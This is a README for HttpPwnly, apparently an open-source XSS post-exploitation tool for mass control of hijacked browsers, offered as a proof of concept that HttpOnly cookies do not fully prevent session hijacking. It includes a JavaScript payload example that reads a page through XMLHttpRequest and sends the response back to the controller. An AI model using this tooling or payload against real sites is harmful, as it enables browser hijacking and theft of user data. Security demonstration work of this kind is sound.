# HttpPwnly

"Repeater" style XSS post-exploitation tool for mass browser control. Primarily a PoC to show why HttpOnly flag isn't a complete protection against session hijacking via XSS.

## Dependencies:
pip install flask flask_sqlalchemy flask_cors

## Demo:
https://www.youtube.com/watch?v=HQYzJKpBHjk

## Asynchronous payloads:
To overide normal task output data within your payload (for example in order to retrieve output from XMLHttpRequest), call the "sendOutput" function and pass it your intended output. For example:

```
var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
      sendOutput(task.id,xmlhttp.responseText);
    }
  };
  xmlhttp.open("GET", "/", true);
  xmlhttp.send();
```
